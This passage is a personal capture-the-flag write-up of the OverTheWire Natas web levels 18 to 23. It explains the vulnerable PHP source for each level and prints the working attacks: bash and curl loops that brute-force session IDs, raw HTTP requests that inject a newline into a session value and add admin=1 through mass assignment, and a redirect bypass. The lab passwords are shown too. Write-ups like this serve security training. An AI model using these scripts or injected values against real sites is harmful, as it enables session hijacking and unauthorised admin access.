xvKIqDjy4OPv7wCRgDlmj0p [+] Password: xvKIqDjy4OPv7wCRgDlmj0pF [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFs [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsC [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCs [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsD [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDj [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd [+] Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP  Natas18 \u0026lt;? $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST[\u0026quot;username\u0026quot;] == \u0026quot;admin\u0026quot;) { /* This method of authentication appears to be unsafe and has been disabled for now. */ //return 1; } return 0; } /* }}} */ function isValidID($id) { /* {{{ */ return is_numeric($id); } /* }}} */ function createID($user) { /* {{{ */ global $maxid; return rand(1, $maxid); } /* }}} */ function debug($msg) { /* {{{ */ if(array_key_exists(\u0026quot;debug\u0026quot;, $_GET)) { print \u0026quot;DEBUG: $msg\u0026lt;br\u0026gt;\u0026quot;; } } /* }}} */ function my_session_start() { /* {{{ */ if(array_key_exists(\u0026quot;PHPSESSID\u0026quot;, $_COOKIE) and isValidID($_COOKIE[\u0026quot;PHPSESSID\u0026quot;])) { if(!session_start()) { debug(\u0026quot;Session start failed\u0026quot;); return false; } else { debug(\u0026quot;Session start ok\u0026quot;); if(!array_key_exists(\u0026quot;admin\u0026quot;, $_SESSION)) { debug(\u0026quot;Session was old: admin flag set\u0026quot;); $_SESSION[\u0026quot;admin\u0026quot;] = 0; // backwards compatible, secure } return true; } } return false; } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\u0026quot;admin\u0026quot;, $_SESSION) and $_SESSION[\u0026quot;admin\u0026quot;] == 1) { print \u0026quot;You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026quot;; print \u0026quot;\u0026lt;pre\u0026gt;Username: natas19\\n\u0026quot;; print \u0026quot;Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026quot;; } else { print \u0026quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\u0026quot;; } } /* }}} */ $showform = true; if(my_session_start()) { print_credentials(); $showform = false; } else { if(array_key_exists(\u0026quot;username\u0026quot;, $_REQUEST) \u0026amp;\u0026amp; array_key_exists(\u0026quot;password\u0026quot;, $_REQUEST)) { session_id(createID($_REQUEST[\u0026quot;username\u0026quot;])); session_start(); $_SESSION[\u0026quot;admin\u0026quot;] = isValidAdminLogin(); debug(\u0026quot;New session started\u0026quot;); $showform = false; print_credentials(); } } if($showform) { ?\u0026gt; \u0026lt;p\u0026gt; Please login with your admin account to retrieve credentials for natas19. \u0026lt;/p\u0026gt; \u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; Username: \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input name=\u0026quot;password\u0026quot;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Login\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;? } ?\u0026gt;  probally somthing in the cookie with PHPSESSID= {\u0026ldquo;PHPSESSID\u0026rdquo;:{\u0026ldquo;httpOnly\u0026rdquo;:true,\u0026ldquo;path\u0026rdquo;:\u0026quot;/\u0026rdquo;,\u0026ldquo;value\u0026rdquo;:\u0026ldquo;238\u0026rdquo;}}\nNo idea how it works. Lets figure it out\nOkay so when you load the page it the following happens: A maxid is set to 640 showform is set to true; If my_session_start returns TRUE: it will call print_credentials. set showform to false Else: check if a username and password has been send, ifso: call createID with the username as input and give the output to session_id run session_start It then sets a custom session variable called admin using a function called isvalidadminlogin; this function though has been disabled and now does not return 1 but simply returns nothing. set showform to false call print_credentials. What does my_session_start do ? if PHPSESSID is in the cookie and the PHPSESSID is valid (numaric number): run session start: if it failes, return false else check if admin exists in $_SESSION ifso set admin to zero. return true. What does print_credentials do ? if the custom session variable admin exits and if its been set to one we will be granted a admin session anything else is a normal user session What does createID do ? Generate a random interger between 1 and the maxid (which is 640) what does session_id do ? session_id() is used to get or set the session id for the current session. If id is specified, it will replace the current session id. session_id() needs to be called before session_start() for that purpose. What does session_start do ? session_start() creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie. So how can we break this ? my_session_start checks if there is a valid PHPSESSID, it will then start the session with that id. If there is currently a PHPSESSID for a admin session, and we correctly guess this, we could get a admin session. This way we entirely skip the $_SESSION[\u0026quot;admin\u0026quot;] = isValidAdminLogin() since this will only be checked/set if my_session_start returns false or if it exists. Since the maxid is been set to 640 this should be brute forceable.  Doing the breakiage.\nMaxCookieID=640 CurrentID=0 while [ $CurrentID -ne $MaxCookieID ] do CurrentID=$(( $CurrentID + 1 )) SessionCookie=\u0026quot;PHPSESSID=$CurrentID\u0026quot; curl_output=$(curl -s $'http://natas18.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' --cookie \u0026quot;$SessionCookie\u0026quot; --data 'username=admin\u0026amp;password=password') if echo $curl_output | grep -q \u0026quot;regular user\u0026quot;; then echo \u0026quot;[-] $CurrentID out of $MaxCookieID is not a admin session.\u0026quot; else echo \u0026quot;[+] $CurrentID out of $MaxCookieID is a admin session.\u0026quot; echo \u0026quot;[+] $(echo $curl_output | grep Password | cut -d \u0026quot;\u0026lt;\u0026quot; -f 1 )\u0026quot; break fi done  [-] 1 out of 640 is not a admin session. [-] 2 out of 640 is not a admin session. [-] 3 out of 640 is not a admin session. [-] 4 out of 640 is not a admin session. [-] 5 out of 640 is not a admin session. [-] 6 out of 640 is not a admin session. [-] 7 out of 640 is not a admin session. [-] 8 out of 640 is not a admin session. [-] 9 out of 640 is not a admin session. ... [-] 115 out of 640 is not a admin session. [-] 116 out of 640 is not a admin session. [-] 117 out of 640 is not a admin session. [-] 118 out of 640 is not a admin session. [+] 119 out of 640 is a admin session. [+] Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs\nNatas19 This page uses mostly the same code as the previous level, but session IDs are no longer sequential... Please login with your admin account to retrieve credentials for natas20.  Lets bake some cookies.\nfor n in {0..1000}; do curl -v -s 'http://natas19.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --data 'username=admin\u0026amp;password=password' 2\u0026gt;\u0026amp;1 | grep PHP done \u0026lt; Set-Cookie: PHPSESSID=312d61646d696e; path=/; HttpOnly \u0026lt; Set-Cookie: PHPSESSID=312d61646d696e; path=/; HttpOnly \u0026lt; Set-Cookie: PHPSESSID=332d61646d696e; path=/; HttpOnly \u0026lt; Set-Cookie: PHPSESSID=342d61646d696e; path=/; HttpOnly ... \u0026lt; Set-Cookie: PHPSESSID=3633352d61646d696e; path=/; HttpOnly \u0026lt; Set-Cookie: PHPSESSID=3633352d61646d696e; path=/; HttpOnly \u0026lt; Set-Cookie: PHPSESSID=3633372d61646d696e; path=/; HttpOnly \u0026lt; Set-Cookie: PHPSESSID=3633382d61646d696e; path=/; HttpOnly  And lets get all the unique PHPSESSID\u0026rsquo;s and sort them.\n312d61646d696e 332d61646d696e 342d61646d696e 352d61646d696e ... 3633372d61646d696e 3633382d61646d696e 3633392d61646d696e 3634302d61646d696e  Looks like there is a fixed value and a variable value in the PHPSESSID\nXX + 2d61646d696e XXXX + 2d61646d696e XXXXXX + 2d61646d696e  The unfixed value is always 2 4 or 6 chars long. ASCII in HEX is 2 chars log. Let check that.\n~# xxd -ps -r phpsessionid.hex phpsessionid.txt ~# cat phpsessionid.txt 1-admin 3-admin 4-admin ... 637-admin 638-admin 639-admin 640-admin  So we have a random number between 1 and 640 again, only with -admin added.\nLets first just try admin (61646d696e) if that doenst work, lets brute force it.\nnope\nSessionCookie=\u0026quot;PHPSESSID=61646d696e\u0026quot; curl_output=$(curl -s $'http://natas19.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --cookie \u0026quot;$SessionCookie\u0026quot; --data 'username=admin\u0026amp;password=password') echo $curl_output \u0026lt;/html\u0026gt; logged in as a regular user. Login as an admin to retrieve credentials for natas20.\u0026lt;/div\u0026gt;al...\u0026lt;/head\u0026gt;thewire.org/js/wechall.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;  Script\nMaxCookieID=640 CurrentID=0 while [ $CurrentID -ne $MaxCookieID ] do CurrentID=$(( $CurrentID + 1 )) CurrentIDHEX=$(echo -n \u0026quot;$CurrentID-admin\u0026quot; | xxd -p) SessionCookie=\u0026quot;PHPSESSID=$CurrentIDHEX\u0026quot; curl_output=$(curl -s $'http://natas19.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --cookie \u0026quot;$SessionCookie\u0026quot; --data 'username=admin\u0026amp;password=password') if echo $curl_output | grep -q \u0026quot;regular user\u0026quot;; then echo \u0026quot;[-] $CurrentID out of $MaxCookieID is not a admin session.\u0026quot; else echo \u0026quot;[+] $CurrentID out of $MaxCookieID is a admin session.\u0026quot; echo \u0026quot;$(echo $curl_output | grep Password)\u0026quot; break fi done  Output\n[-] 1 out of 640 is not a admin session. [-] 2 out of 640 is not a admin session. [-] 3 out of 640 is not a admin session. [-] 4 out of 640 is not a admin session. ... [-] 278 out of 640 is not a admin session. [-] 279 out of 640 is not a admin session. [-] 280 out of 640 is not a admin session. [+] 281 out of 640 is a admin session. \u0026lt;/html\u0026gt; an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026lt;pre\u0026gt;Username: natas20 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF\u0026lt;/pre\u0026gt;\u0026lt;/div\u0026gt;script\u0026gt;  eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF\nnatas21 \u0026lt;? function debug($msg) { /* {{{ */ if(array_key_exists(\u0026quot;debug\u0026quot;, $_GET)) { print \u0026quot;DEBUG: $msg\u0026lt;br\u0026gt;\u0026quot;; } } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\u0026quot;admin\u0026quot;, $_SESSION) and $_SESSION[\u0026quot;admin\u0026quot;] == 1) { print \u0026quot;You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026quot;; print \u0026quot;\u0026lt;pre\u0026gt;Username: natas21\\n\u0026quot;; print \u0026quot;Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026quot;; } else { print \u0026quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\u0026quot;; } } /* }}} */ /* we don't need this */ function myopen($path, $name) { //debug(\u0026quot;MYOPEN $path $name\u0026quot;); return true; } /* we don't need this */ function myclose() { //debug(\u0026quot;MYCLOSE\u0026quot;); return true; } function myread($sid) { debug(\u0026quot;MYREAD $sid\u0026quot;); if(strspn($sid, \u0026quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\u0026quot;) != strlen($sid)) { debug(\u0026quot;Invalid SID\u0026quot;); return \u0026quot;\u0026quot;; } $filename = session_save_path() . \u0026quot;/\u0026quot; . \u0026quot;mysess_\u0026quot; . $sid; if(!file_exists($filename)) { debug(\u0026quot;Session file doesn't exist\u0026quot;); return \u0026quot;\u0026quot;; } debug(\u0026quot;Reading from \u0026quot;. $filename); $data = file_get_contents($filename); $_SESSION = array(); foreach(explode(\u0026quot;\\n\u0026quot;, $data) as $line) { debug(\u0026quot;Read [$line]\u0026quot;); $parts = explode(\u0026quot; \u0026quot;, $line, 2); if($parts[0] != \u0026quot;\u0026quot;) $_SESSION[$parts[0]] = $parts[1]; } return session_encode(); } function mywrite($sid, $data) { // $data contains the serialized version of $_SESSION // but our encoding is better debug(\u0026quot;MYWRITE $sid $data\u0026quot;); // make sure the sid is alnum only!! if(strspn($sid, \u0026quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\u0026quot;) != strlen($sid)) { debug(\u0026quot;Invalid SID\u0026quot;); return; } $filename = session_save_path() . \u0026quot;/\u0026quot; . \u0026quot;mysess_\u0026quot; . $sid; $data = \u0026quot;\u0026quot;; debug(\u0026quot;Saving in \u0026quot;. $filename); ksort($_SESSION); foreach($_SESSION as $key =\u0026gt; $value) { debug(\u0026quot;$key =\u0026gt; $value\u0026quot;); $data .= \u0026quot;$key $value\\n\u0026quot;; } file_put_contents($filename, $data); chmod($filename, 0600); } /* we don't need this */ function mydestroy($sid) { //debug(\u0026quot;MYDESTROY $sid\u0026quot;); return true; } /* we don't need this */ function mygarbage($t) { //debug(\u0026quot;MYGARBAGE $t\u0026quot;); return true; } session_set_save_handler( \u0026quot;myopen\u0026quot;, \u0026quot;myclose\u0026quot;, \u0026quot;myread\u0026quot;, \u0026quot;mywrite\u0026quot;, \u0026quot;mydestroy\u0026quot;, \u0026quot;mygarbage\u0026quot;); session_start(); if(array_key_exists(\u0026quot;name\u0026quot;, $_REQUEST)) { $_SESSION[\u0026quot;name\u0026quot;] = $_REQUEST[\u0026quot;name\u0026quot;]; debug(\u0026quot;Name set to \u0026quot; . $_REQUEST[\u0026quot;name\u0026quot;]); } print_credentials(); $name = \u0026quot;\u0026quot;; if(array_key_exists(\u0026quot;name\u0026quot;, $_SESSION)) { $name = $_SESSION[\u0026quot;name\u0026quot;]; } ?\u0026gt;  Thought it had something todo with the SID. Could not figure it out.\nUsed a write up to get a hint for the newline (\\n).\nEverything in $_SESSION is added to data with a newline delimiter by the mywrite function. Data is then written to a session file.\nksort($_SESSION); foreach($_SESSION as $key =\u0026gt; $value) { debug(\u0026quot;$key =\u0026gt; $value\u0026quot;); $data .= \u0026quot;$key $value\\n\u0026quot;; } file_put_contents($filename, $data); chmod($filename, 0600);  https://www.php.net/manual/en/function.explode.php\nexplode — Split a string by a string\nEverything written in session file is read by the myread function.\nSpaces in files are used by explode to split the string. as long as the first part is not equal to \u0026quot;\u0026rdquo; the first part and seccond part of the explode are added back in the global $_SESSION variable.\nforeach(explode(\u0026quot;\\n\u0026quot;, $data) as $line) { debug(\u0026quot;Read [$line]\u0026quot;); $parts = explode(\u0026quot; \u0026quot;, $line, 2); if($parts[0] != \u0026quot;\u0026quot;) $_SESSION[$parts[0]] = $parts[1]; }  This means if we write a session file that has 2 lines like this.\nname somename admin 1  the read function will do the following.\n$_SESSION[name] = somename $_SESSION[admin] = 1  this will then pass the print_credentials check. How do we do this ? Add a newline to the input.\nadmin\\nadmin 1\nPOST /index.php HTTP/1.1 Host: natas20.natas.labs.overthewire.org User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 22 Authorization: Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg== Connection: close Referer: http://natas20.natas.labs.overthewire.org/index.php Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=sess Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache name=admin%0Aadmin%201  After running this port request a session file for PHPSESSID=sess has been created with the extra admin 1 value. If we load this PHPSESSID we will pass the admin check.\nYou are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026lt;pre\u0026gt;Username: natas21 Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ\u0026lt;/pre\u0026gt;  natas22 \u0026lt;? function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\u0026quot;admin\u0026quot;, $_SESSION) and $_SESSION[\u0026quot;admin\u0026quot;] == 1) { print \u0026quot;You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026quot;; print \u0026quot;\u0026lt;pre\u0026gt;Username: natas22\\n\u0026quot;; print \u0026quot;Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026quot;; } else { print \u0026quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.\u0026quot;; } } /* }}} */ session_start(); print_credentials(); ?\u0026gt;  \u0026lt;? session_start(); // if update was submitted, store it if(array_key_exists(\u0026quot;submit\u0026quot;, $_REQUEST)) { foreach($_REQUEST as $key =\u0026gt; $val) { $_SESSION[$key] = $val; } } if(array_key_exists(\u0026quot;debug\u0026quot;, $_GET)) { print \u0026quot;[DEBUG] Session contents:\u0026lt;br\u0026gt;\u0026quot;; print_r($_SESSION); } // only allow these keys $validkeys = array(\u0026quot;align\u0026quot; =\u0026gt; \u0026quot;center\u0026quot;, \u0026quot;fontsize\u0026quot; =\u0026gt; \u0026quot;100%\u0026quot;, \u0026quot;bgcolor\u0026quot; =\u0026gt; \u0026quot;yellow\u0026quot;); $form = \u0026quot;\u0026quot;; $form .= '\u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;'; foreach($validkeys as $key =\u0026gt; $defval) { $val = $defval; if(array_key_exists($key, $_SESSION)) { $val = $_SESSION[$key]; } else { $_SESSION[$key] = $val; } $form .= \u0026quot;$key: \u0026lt;input name='$key' value='$val' /\u0026gt;\u0026lt;br\u0026gt;\u0026quot;; } $form .= '\u0026lt;input type=\u0026quot;submit\u0026quot; name=\u0026quot;submit\u0026quot; value=\u0026quot;Update\u0026quot; /\u0026gt;'; $form .= '\u0026lt;/form\u0026gt;'; $style = \u0026quot;background-color: \u0026quot;.$_SESSION[\u0026quot;bgcolor\u0026quot;].\u0026quot;; text-align: \u0026quot;.$_SESSION[\u0026quot;align\u0026quot;].\u0026quot;; font-size: \u0026quot;.$_SESSION[\u0026quot;fontsize\u0026quot;].\u0026quot;;\u0026quot;; $example = \u0026quot;\u0026lt;div style='$style'\u0026gt;Hello world!\u0026lt;/div\u0026gt;\u0026quot;; ?\u0026gt; \u0026lt;p\u0026gt;Example:\u0026lt;/p\u0026gt; \u0026lt;?=$example?\u0026gt; \u0026lt;p\u0026gt;Change example values here:\u0026lt;/p\u0026gt; \u0026lt;?=$form?\u0026gt;  goal, get admin=1 in the $_SESSION\nCould not figure out what todo next. Used write up to understand what was going on.\nIt was actully rather simple. The main page will print the password if admin=1 is in $_SESSION. We can add this on the second page.\nSince both pages seem to share PHPSESSIDs we should be able to abuse page 2 to influcense page 1.\nA var called validkeys is setup, it then uses these validkeys as default values.and updates these values if they exists, if not it adds them\n$validkeys = array(\u0026quot;align\u0026quot; =\u0026gt; \u0026quot;center\u0026quot;, \u0026quot;fontsize\u0026quot; =\u0026gt; \u0026quot;100%\u0026quot;, \u0026quot;bgcolor\u0026quot; =\u0026gt; \u0026quot;yellow\u0026quot;); $form .= '\u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;'; foreach($validkeys as $key =\u0026gt; $defval) { $val = $defval; if(array_key_exists($key, $_SESSION)) { $val = $_SESSION[$key]; } else { $_SESSION[$key] = $val; } $form .= \u0026quot;$key: \u0026lt;input name='$key' value='$val' /\u0026gt;\u0026lt;br\u0026gt;\u0026quot;; }  However, above this code is this peace. This code checks if submit is in the $_REQUEST global variable. If it is it adds everything thats in $_REQUEST to $_SESSION.\nif(array_key_exists(\u0026quot;submit\u0026quot;, $_REQUEST)) { foreach($_REQUEST as $key =\u0026gt; $val) { $_SESSION[$key] = $val; } }  This means if during a request that uses submit we can add our of values to the $_SESSION variable. If we add \u0026amp;admin=1 we will pass the print_credentials() check on the main page.\nPOST /index.php?debug HTTP/1.1 Host: natas21-experimenter.natas.labs.overthewire.org User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://natas21-experimenter.natas.labs.overthewire.org/index.php Content-Type: application/x-www-form-urlencoded Content-Length: 65 Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg== Connection: close Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none) Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache align=center\u0026amp;fontsize=100%25\u0026amp;bgcolor=yellow\u0026amp;submit=Update\u0026amp;admin=1 HTTP/1.0 200 OK Date: Mon, 23 Sep 2019 12:09:42 GMT Server: Apache/2.4.10 (Debian) Set-Cookie: PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7; path=/; HttpOnly Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Vary: Accept-Encoding Content-Length: 1015 Content-Type: text/html; charset=UTF-8 X-Cache: MISS from localhost Via: 1.1 localhost:3128 (squid/2.7.STABLE9) Connection: close  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;http://www.overthewire.org/wargames/natas/level.css\u0026quot;\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas21 - CSS style experimenter\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;content\u0026quot;\u0026gt; \u0026lt;p\u0026gt; \u0026lt;b\u0026gt;Note: this website is colocated with \u0026lt;a href=\u0026quot;http://natas21.natas.labs.overthewire.org\u0026quot;\u0026gt;http://natas21.natas.labs.overthewire.org\u0026lt;/a\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;/p\u0026gt; [DEBUG] Session contents:\u0026lt;br\u0026gt;Array ( [debug] =\u0026gt; [align] =\u0026gt; center [fontsize] =\u0026gt; 100% [bgcolor] =\u0026gt; yellow [submit] =\u0026gt; Update [admin] =\u0026gt; 1 )  This means that our PHPSESSID now has admin=1\nIf we send a request to the main page with below PHPSESSID we will pass the admin check.\nPHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7\nGET /index.php HTTP/1.1 Host: natas21.natas.labs.overthewire.org User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg== Connection: close Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7 Upgrade-Insecure-Requests: 1 You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026lt;pre\u0026gt;Username: natas22 Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ\u0026lt;/pre\u0026gt;  chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ\nnatas23 \u0026lt;? session_start(); if(array_key_exists(\u0026quot;revelio\u0026quot;, $_GET)) { // only admins can reveal the password if(!($_SESSION and array_key_exists(\u0026quot;admin\u0026quot;, $_SESSION) and $_SESSION[\u0026quot;admin\u0026quot;] == 1)) { header(\u0026quot;Location: /\u0026quot;); } } ?\u0026gt; \u0026lt;? if(array_key_exists(\u0026quot;revelio\u0026quot;, $_GET)) { print \u0026quot;You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026quot;; print \u0026quot;\u0026lt;pre\u0026gt;Username: natas23\\n\u0026quot;; print \u0026quot;Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026quot;; } ?\u0026gt;  If revelio is in $_GET and admin is not set add a location header. This will result in a 302 redirect. Then, if revelio is in the $_GET request show the password.\nWe can set revelio with teh following params.\nnatas22.natas.labs.overthewire.org/?revelio=a\nbut if we do we get redirected.\nTried messing with the location cookie in the request. Turned out its way simpler, dont follow the 302.\nBurp -\u0026gt; look at request that gets 302\u0026rsquo;ed.\nYou are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026lt;pre\u0026gt;Username: natas23 Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE\u0026lt;/pre\u0026gt;  D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE\nnatas24 Password: \u0026lt;form name=\u0026quot;input\u0026quot; method=\u0026quot;get\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;passwd\u0026quot; size=20\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Login\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; ```php if(array_key_exists(\u0026quot;passwd\u0026quot;,$_REQUEST)){ if(strstr($_REQUEST[\u0026quot;passwd\u0026quot;],\u0026quot;iloveyou\u0026quot;) \u0026amp;\u0026amp; ($_REQUEST[\u0026quot;passwd\u0026quot;] \u0026gt; 10 )){ echo \u0026quot;\u0026lt;br\u0026gt;The credentials for the next level are:\u0026lt;br\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;pre\u0026gt;Username: natas24 Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026quot;; } else{ echo \u0026quot;\u0026lt;br\u0026gt;Wrong!\u0026lt;br\u0026gt;\u0026quot;; } } // morla / 10111 ?\u0026gt;  Could not figure this one out. After reading up on a write up, some PHP documentation and testing it myself I now understand what happens.\nhttps://www.php.net/manual/en/function.strstr.php\nhttps://www.php.net/manual/en/language.types.string.php#language.types.string.conversion\nhttps://stackoverflow.com/questions/672040/comparing-string-to-integer-gives-strange-results\nhttps://n0j.github.io/2017/03/23/otw-natas-23.html\nhttps://blog.anshumanonline.com/natas24/\nstrstr — Find the first occurrence of a string  Now, PHP has a property that on comparison with numerals, the string will evaluate as numerals. If the string has a ‘e’ in it, it will be evaluated as a float variable, otherwise an int. Since there is necessarily an ‘e’ in our string (because of the “iloveyou”), our passwd will be evaluated as a float. Another interesting thing is that, while this comparison, the value of the string being evaluated as a numeral will be from the initial part of the string. If there is no numeral in the initial part, the evaluation will return as 0.  When a string is evaluated in a numeric context, the resulting value and type are determined as follows. The string will be evaluated as a float if it contains any of the characters '.', 'e', or 'E'. Otherwise, it will be evaluated as an integer. The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero). Valid numeric data is an optional sign, followed by one or more digits (optionally containing a decimal point), followed by an optional exponent. The exponent is an 'e' or 'E' followed by one or more digits.  The == operator is a loosely-typed comparison. It will convert both to a common type and compare them. The way strings are converted to integers is explained here. Note that the page you linked to doesn't contradict this. Check the second table, where it says that comparing the integer 0 to a string \u0026quot;php\u0026quot; using == shall be true. What happens is that the string is converted to integer, and non-numeric strings (strings that do not contain or begin with a number) convert to 0.  A string that consists of a number, or begins with a number, is considered a numeric string. If the string has other characters after that number, these are ignored.\nIf a string starts with a character that cannot be interpreted as part of a number, then it is a non-numeric string and will convert to 0. This doesn\u0026rsquo;t mean that a numeric string has to start with a digit (0-9) - for example \u0026ldquo;-1\u0026rdquo; is a numeric string because the minus sign is part of a number in that case.\nSo for example, your string \u0026ldquo;d85d1d81b25614a3504a3d5601a9cb2e\u0026rdquo; does not start with a number, so it would convert to 0. But your second string \u0026ldquo;3581169b064f71be1630b321d3ca318f\u0026rdquo; would be converted to integer 3581169. So that\u0026rsquo;s why your second test does not work the same way.\n```php strstr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] ) : string  haystack The input string. needle If needle is not a string, it is converted to an integer and applied as the ordinal value of a character. This behavior is deprecated as of PHP 7.3.0, and relying on it is highly discouraged. Depending on the intended behavior, the needle should either be explicitly cast to string, or an explicit call to chr() should be performed. before_needle If TRUE, strstr() returns the part of the haystack before the first occurrence of the needle (excluding the needle).  if(strstr(\u0026quot;11aaaaaailoveyou\u0026quot;,\u0026quot;iloveyou\u0026quot;)){echo \u0026quot;a\u0026quot;;} a if(\u0026quot;11iloveyou\u0026quot; \u0026gt; 10 ){echo \u0026quot;a\u0026quot;;} a  So what happens is that even though our string starts with 11, it passes whte strstr check. Why ? Becase strstr checks for the first occurrence of a string. It does not verify if the string is an exact match.\nAs long as iloveyou ocourse somewhere in the string it will return true.\nif(strstr(\u0026quot;11aaaaaailoveyou\u0026quot;,\u0026quot;iloveyou\u0026quot;)){echo \u0026quot;a\u0026quot;;} a  Then, duo the type conversion to a float (since our string contains a e) the iloveyou part is removed during the int check.\nWhen a string is evaluated in a numeric context, the resulting value and type are determined as follows. The string will be evaluated as a float if it contains any of the characters '.', 